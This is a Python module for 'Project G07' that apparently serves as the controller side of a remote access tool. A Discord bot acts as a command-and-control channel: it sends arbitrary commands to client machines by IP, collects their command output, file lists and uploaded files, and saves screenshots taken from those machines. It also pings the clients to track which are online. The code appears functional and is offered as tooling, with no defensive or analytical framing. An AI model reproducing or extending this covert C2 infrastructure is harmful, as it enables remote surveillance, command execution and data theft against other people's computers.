"""
Discord Bot Manager
"""
import discord
from discord.ext import commands
import asyncio
from threading import Thread
from typing import Optional, Callable
from datetime import datetime, timezone
from utils.config_manager import ConfigManager
import os, aiohttp

class DiscordBot:
    def __init__(self, token: str, guild_id: int, channel_name: str = "g07-control"):
        self.token = token
        self.guild_id = guild_id
        self.channel_name = channel_name
        self.bot: Optional[commands.Bot] = None
        self.thread: Optional[Thread] = None
        self.running = False
        self.ready = False
        self.on_client_connect: Optional[Callable] = None
        self.on_screenshot: Optional[Callable] = None
        self.control_channel = None
        self.config = ConfigManager()
        # Allow configurable ping interval via config (fallback 45s)
        try:
            self.ping_interval = int(self.config.get('ping_interval', 45))
        except Exception:
            self.ping_interval = 45
        self.client_seen = {}  # ip -> last_seen timestamp
        self.ping_task = None
        self.terminal_callbacks = {}  # ip -> list of callbacks to deliver command output
        self.screenshot_dir = os.path.join(os.getcwd(), 'screenshots')
        try:
            os.makedirs(self.screenshot_dir, exist_ok=True)
        except Exception:
            pass
    
    def start(self):
        """Start the Discord bot in a separate thread"""
        if self.running:
            return
        
        self.running = True
        self.ready = False
        self.thread = Thread(target=self._run_bot, daemon=True)
        self.thread.start()
        print("Starting Discord Controller Bot...")
    
    def stop(self):
        """Stop the Discord bot"""
        self.running = False
        self.ready = False
        if self.bot:
            try:
                asyncio.run_coroutine_threadsafe(self.bot.close(), self.bot.loop)
            except:
                pass
    
    def _run_bot(self):
        """Run the bot in the thread"""
        intents = discord.Intents.default()
        intents.message_content = True
        intents.guilds = True
        
        self.bot = commands.Bot(command_prefix="!", intents=intents)
        
        @self.bot.event
        async def on_ready():
            print(f'Controller Bot connected as {self.bot.user}')
            
            # Get guild
            guild = self.bot.get_guild(self.guild_id)
            if not guild:
                print(f'Guild with ID {self.guild_id} not found!')
                return
            
            print(f'Connected to server: {guild.name}')
            
            # Check if control channel exists
            self.control_channel = discord.utils.get(guild.channels, name=self.channel_name)
            
            if not self.control_channel:
                # Create control channel
                try:
                    print(f'Creating channel: {self.channel_name}...')
                    self.control_channel = await guild.create_text_channel(
                        self.channel_name,
                        topic="Project G07 Control Channel - Commands are sent here",
                        reason="Project G07 Setup"
                    )
                    print(f'Channel #{self.channel_name} created!')
                    
                    # Send welcome message
                    await self.control_channel.send(
                        "🚀 **Project G07 Controller Bot is online!**\n"
                        "This channel is used for client communication.\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━"
                    )
                except Exception as e:
                    print(f'Failed to create channel: {e}')
            else:
                print(f'Using existing channel: #{self.channel_name}')
                await self.control_channel.send("**Controller Bot reconnected!**")
            
            self.ready = True
            # Start broadcast ping loop
            try:
                self.ping_task = asyncio.create_task(self._broadcast_ping_loop())
            except Exception as e:
                print(f"Failed to start ping loop: {e}")
        
        @self.bot.event
        async def on_message(message):
            # Ignore own messages
            if message.author == self.bot.user:
                return
            
            # Only process messages in control channel
            if message.channel.name != self.channel_name:
                return
            
            # Check for client connection messages
            if "Client connected:" in message.content:
                print(f"New client: {message.content}")
                # Parse: "🟢 Client connected: HOSTNAME (IP)"
                try:
                    parts = message.content.split(":")
                    if len(parts) >= 2:
                        info = parts[1].strip()
                        if "(" in info and ")" in info:
                            hostname = info.split("(")[0].strip()
                            ip = info.split("(")[1].split(")")[0].strip()

                            if self.on_client_connect:
                                self.on_client_connect(hostname, ip)
                                # mark seen
                                try:
                                    self.client_seen[ip] = datetime.now(timezone.utc).isoformat()
                                except:
                                    pass
                except Exception as e:
                    print(f"Error parsing client info: {e}")

            # Detect PONG replies from broadcast
            if message.content.strip().upper().startswith('PONG:'):
                try:
                    # Format: PONG: HOSTNAME (IP)
                    content = message.content.split(':', 1)[1].strip()
                    if '(' in content and ')' in content:
                        hostname = content.split('(')[0].strip()
                        ip = content.split('(')[1].split(')')[0].strip()

                        print(f"PONG received from {hostname} ({ip})")

                        # Update config - set client online and last_ping
                        try:
                            cfg = self.config
                            clients = cfg.get('clients', []) or []
                            found = False
                            for c in clients:
                                if c.get('ip') == ip:
                                    c['hostname'] = hostname
                                    c['status'] = 'online'
                                    c['last_ping'] = datetime.now(timezone.utc).isoformat()
                                    found = True
                                    break
                            if not found:
                                clients.append({
                                    'hostname': hostname,
                                    'ip': ip,
                                    'status': 'online',
                                    'last_ping': datetime.now(timezone.utc).isoformat()
                                })
                            cfg.set('clients', clients)
                            cfg.save()
                        except Exception as e:
                            print(f"Failed updating config for PONG: {e}")

                        # Call GUI callback
                        if self.on_client_connect:
                            try:
                                self.on_client_connect(hostname, ip)
                            except Exception:
                                pass
                        # mark seen
                        try:
                            self.client_seen[ip] = datetime.now(timezone.utc).isoformat()
                        except:
                            pass
                except Exception as e:
                    print(f"Error parsing PONG: {e}")
            
            # Check for screenshots
            elif message.attachments and self.on_screenshot:
                for attachment in message.attachments:
                    if attachment.content_type and attachment.content_type.startswith('image/'):
                        # Extract IP from message content
                        if "Screenshot from" in message.content:
                            try:
                                hostname = message.content.split("Screenshot from")[1].split(":")[0].strip()
                                # Download image locally first
                                local_path = await self._download_attachment(attachment)
                                # Provide local file path to callback instead of remote URL
                                from concurrent.futures import ThreadPoolExecutor
                                executor = ThreadPoolExecutor(max_workers=1)
                                executor.submit(self.on_screenshot, hostname, local_path)
                            except Exception as e:
                                print(f"Error processing screenshot: {e}")

                        # invoke generic file download callbacks if registered
                        try:
                            # attempt to extract IP prefix if present like: "FILE <IP> <name>" or similar
                            ip_candidate = None
                            parts = message.content.split()
                            if len(parts) >= 2 and parts[0].upper() in ('FILE', 'FILELIST'):
                                ip_candidate = parts[1]
                            local_path = await self._download_attachment(attachment)
                            for cb in getattr(self, 'file_download_callbacks', []):
                                try:
                                    cb(ip_candidate, local_path, attachment.filename)
                                except Exception:
                                    pass
                        except Exception:
                            pass

            # Terminal command output detection (simple heuristic)
            if message.content.startswith('CMDOUT ') and ':' in message.content:
                # Format expected: CMDOUT ip: actual output...
                try:
                    header, payload = message.content.split(' ', 1)[1].split(':', 1)
                    ip = header.strip()
                    output = payload.strip()
                    callbacks = self.terminal_callbacks.get(ip, [])
                    for cb in callbacks:
                        try:
                            cb(output)
                        except Exception:
                            pass
                except Exception as e:
                    print(f"Error parsing CMDOUT: {e}")

            # FILELIST message: FILELIST <ip>: <json>
            if message.content.startswith('FILELIST ') and ':' in message.content:
                try:
                    header, payload = message.content.split(' ', 1)[1].split(':', 1)
                    ip = header.strip()
                    data = payload.strip()
                    # dispatch to any registered filelist callbacks
                    for cb in getattr(self, 'filelist_callbacks', []):
                        try:
                            cb(ip, data)
                        except Exception:
                            pass
                except Exception as e:
                    print(f"Error parsing FILELIST: {e}")
        
        try:
            self.bot.run(self.token)
        except Exception as e:
            print(f"Bot error: {e}")
            self.running = False
            self.ready = False

    async def _broadcast_ping_loop(self):
        """Periodically broadcast a 'whoami' ping so clients can respond with PONG."""
        try:
            while self.running and self.ready:
                try:
                    if self.control_channel:
                        await self.control_channel.send("whoami")  # discovery ping
                        await self.control_channel.send("heartbeat")  # soft keep-alive
                        print("Broadcast: whoami & heartbeat")
                except Exception as e:
                    print(f"Broadcast ping error: {e}")

                # Mark clients offline if not seen recently
                try:
                    now = datetime.now(timezone.utc)
                    cfg = self.config
                    clients = cfg.get('clients', []) or []
                    updated = False
                    offline_timeout = cfg.get('offline_timeout', 90)
                    for c in clients:
                        ip = c.get('ip')
                        last = None
                        if ip and ip in self.client_seen:
                            try:
                                last = datetime.fromisoformat(self.client_seen[ip])
                            except:
                                last = None
                        # mark offline if not seen within 30s
                        if last is None or (now - last).total_seconds() > offline_timeout:
                            if c.get('status') != 'offline':
                                c['status'] = 'offline'
                                updated = True
                        else:
                            if c.get('status') != 'online':
                                c['status'] = 'online'
                                updated = True
                    if updated:
                        cfg.set('clients', clients)
                        cfg.save()
                except Exception as e:
                    print(f"Error updating offline statuses: {e}")

                await asyncio.sleep(self.ping_interval)
        except asyncio.CancelledError:
            return
    
    def send_command(self, ip: str, command: str):
        """Send command to a client via Discord"""
        if not self.bot or not self.running or not self.ready:
            print(f"Bot not ready! Running: {self.running}, Ready: {self.ready}")
            return False
        
        async def _send():
            if self.control_channel:
                try:
                    await self.control_channel.send(f"{ip}:{command}")
                    print(f"Command sent: {ip}:{command}")
                    return True
                except Exception as e:
                    print(f"Failed to send command: {e}")
                    return False
            else:
                guild = self.bot.get_guild(self.guild_id)
                if guild:
                    channel = discord.utils.get(guild.channels, name=self.channel_name)
                    if channel:
                        self.control_channel = channel
                        await channel.send(f"{ip}:{command}")
                        print(f"Command sent: {ip}:{command}")
                        return True
            return False
        
        if self.bot.loop and self.bot.loop.is_running():
            try:
                future = asyncio.run_coroutine_threadsafe(_send(), self.bot.loop)
                return future.result(timeout=5)
            except Exception as e:
                print(f"Error sending command: {e}")
                return False
        
        return False
    
    def is_ready(self):
        """Check if bot is ready"""
        return self.running and self.ready

    async def _download_attachment(self, attachment):
        """Download a discord attachment locally and return the file path."""
        filename = attachment.filename
        safe_name = filename.replace('..', '_')
        local_path = os.path.join(self.screenshot_dir, safe_name)
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(attachment.url) as resp:
                    if resp.status == 200:
                        data = await resp.read()
                        with open(local_path, 'wb') as f:
                            f.write(data)
                        return local_path
        except Exception as e:
            print(f"Failed to download attachment: {e}")
        return attachment.url

    def register_terminal_callback(self, ip: str, callback):
        """Register a callback to receive CMDOUT for a given client IP."""
        self.terminal_callbacks.setdefault(ip, []).append(callback)

    def register_filelist_callback(self, callback):
        """Register a callback that will be invoked when a FILELIST message arrives. Callback signature: (ip, json_payload)"""
        self.filelist_callbacks = getattr(self, 'filelist_callbacks', [])
        self.filelist_callbacks.append(callback)

    def register_file_download_callback(self, callback):
        """Register a callback for when a file attachment is received. Callback signature: (ip, local_path, filename)"""
        self.file_download_callbacks = getattr(self, 'file_download_callbacks', [])
        self.file_download_callbacks.append(callback)
